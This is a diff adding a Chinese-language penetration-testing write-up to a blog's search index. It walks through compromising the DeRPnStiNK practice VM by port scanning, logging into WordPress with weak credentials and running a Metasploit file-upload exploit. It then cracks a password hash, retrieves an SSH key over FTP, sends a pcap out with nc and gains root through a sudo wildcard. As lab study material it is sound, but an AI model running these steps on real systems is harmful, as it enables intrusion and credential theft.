@@ -1838,4 +1838,77 @@ padBuster.pl url plaintext[String] Block_Size -encoding x
         <tag>Java安全</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DeRPStiNK-靶场</title>
+    <url>/2026/05/12/DeRPStiNK-%E9%9D%B6%E5%9C%BA/DeRPStiNK-%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sS -p 1-1000 10.201.2.66</span><br><span class="line">sudo masscan 10.201.2.66 -p1-1000</span><br><span class="line">sudo masscan 10.201.2.66 -p1-65535</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428150732151.png"></p>
+<ul>
+<li>21：FTP</li>
+<li>22：SSH</li>
+<li>80：访问80端口<img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428155922811.png"><span id="more"></span></li>
+</ul>
+<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://10.201.2.66</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428152017559.png"></p>
+<ul>
+<li>robots.txt：<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428160255053.png"></li>
+<li>&#x2F;temporary&#x2F;<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428160322065.png"></li>
+<li>&#x2F;weblog<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428163432299.png"></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428163305388.png"><br>（按照网站的提示这里需要配置hosts文件）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/hosts</span><br><span class="line">10.201.2.66 derpnstink.local</span><br><span class="line">ping derpnstink.local</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428160743479.png"></p>
+<ul>
+<li>&#x2F;php&#x2F;phpmyadmin<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428160831987.png"></li>
+<li>&#x2F;weblog&#x2F;wp-admin<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428160930523.png"></li>
+</ul>
+<h3 id="识别服务"><a href="#识别服务" class="headerlink" title="识别服务"></a>识别服务</h3><p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428161432674.png"></p>
+<h1 id="漏洞识别"><a href="#漏洞识别" class="headerlink" title="漏洞识别"></a>漏洞识别</h1><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>针对&#x2F;weblog的wordpress进行wpscan</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://derpnstink.local/weblog/ --enumerate vp,vt,u --max-threads 3 --force</span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里识别到了用户admin<br>![[Pasted image 20260428161957.png]]<br>尝试弱口令<br>得到admin&#x2F;admin能够登陆<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260428162101008.png"></li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wpscan --url http:<span class="regexp">//</span>derpnstink.local<span class="regexp">/weblog/</span>  </span><br></pre></td></tr></table></figure>
+<p>![[Pasted image 20260428172157.png]]<br>这里识别到了：<code>Slideshow Gallery 版本1.4.6</code><br>msf搜索一下历史漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">search Slideshow Gallery</span><br><span class="line">use 0</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+<p>存在文件上传<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512113225303.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhosts 10.200.1.3</span><br><span class="line"><span class="built_in">set</span> targeturi /weblog</span><br><span class="line"><span class="built_in">set</span> wp_user admin</span><br><span class="line"><span class="built_in">set</span> wp_password admin </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512130659994.png"></p>
+<p>打开<code>/var/www/html/weblog/wp-config.php</code>能够看到数据库的名称和登陆数据库所需要的账号&amp;密码：<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512130928141.png"><br>root&#x2F;mysql可据此登陆phpmyadmin<br>这个密码应该弱口令也能跑出来<br>登陆phpmyadmin可以看到：<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512135201520.png"></p>
+<p>除了root以外的还有一个用户，尝试使用工具破解账户derpstink.local对应的hash值：<br><code>$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41</code><br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512135326388.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41&#x27;</span> &gt; hash.txt</span><br><span class="line">john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512135805796.png"><br>得到unclestinky&#x2F;wedgie57</p>
+<h3 id="ftp-ssh"><a href="#ftp-ssh" class="headerlink" title="ftp&amp;&amp;ssh"></a>ftp&amp;&amp;ssh</h3><p>查看home目录下发现有mrderp和stinky用户<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512140456987.png"><br>之前扫描端口发现存在21的ftp服务，用破解的密码试试登陆ftp<br>发现可以登陆stinky&#x2F;wedgie57<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512141043857.png"></p>
+<p>在&#x2F;ssh&#x2F;ssh&#x2F;ssh&#x2F;ssh&#x2F;ssh&#x2F;ssh&#x2F;ssh&#x2F;key.txt存放了ssh登陆key，用get命令下载到本地：<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512143054915.png"></p>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512143241709.png"><br>使用ssh登陆：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> key.txt derpkey.rsa</span><br><span class="line"><span class="built_in">chmod</span> 600 derpkey.rsa</span><br><span class="line">ssh -i derpkey.rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa stinky@10.200.1.104</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512143910103.png"></p>
+<p>发现Documents下存在pcap文件，尝试下载到本地使用wireshark分析一下</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings derpissues.pcap | grep mrderp</span><br><span class="line"></span><br><span class="line">nc -lvnp 8888 &gt; derpissues.pcap</span><br><span class="line"></span><br><span class="line">nc 10.200.1.87 8888 &lt; derpissues.pcap</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512144434871.png"></p>
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512144924880.png"><br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512144946830.png"><br>wireshark分析：<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512145753202.png"><br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512145906899.png"><br>得到mrderp&#x2F;derpderpderpderpderpderpderp<br>用这个ssh连接：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mrderp@10.200.1.104</span><br></pre></td></tr></table></figure>
+<p>发现Desktop&#x2F;helpdesk.log存在一些提示信息<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512150642665.png"><br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512150908908.png"><br>可以运行derpy二进制<br>先查看一下权限：<br><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512151044711.png"></p>
+<ul>
+<li><p><code>env_reset</code> → 运行 sudo 时重置环境变量（防止环境变量被利用提权）</p>
+</li>
+<li><p><code>mail_badpass</code> → 密码错误时发送邮件通知</p>
+</li>
+<li><p><code>secure_path</code> → sudo 执行命令时的 PATH 安全路径<br>总体意思：系统默认安全设置，不影响对具体命令的 sudo 权限<br>但是这里：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User mrderp may run the following commands on DeRPnStiNK:</span><br><span class="line">    (ALL) /home/mrderp/binaries/derpy*</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>(ALL)</code> → 可以以 <strong>任何用户（包括 root）</strong> 来执行这个命令<code>/home/mrderp/binaries/derpy*</code> → 你能用 sudo 执行 <code>derpy</code> 目录下以 <code>derpy</code> 开头的所有文件<br>假设 <code>/home/mrderp/binaries/derpy</code> 是可执行文件，执行：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /home/mrderp/binaries/derpy</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这个命令将以 root 权限运行 <code>derpy</code></p>
+</li>
+<li><p>如果 <code>derpy</code> 是一个 shell 或者能调用 shell，就能拿到 root shell</p>
+</li>
+</ul>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> binaries</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/sh&#x27;</span> &gt; derpy.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 derpy.sh</span><br><span class="line">sudo ./derpy.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/M1ntIce/image/master/20260512152646308.png"></p>
+]]></content>
+  </entry>
 </search>
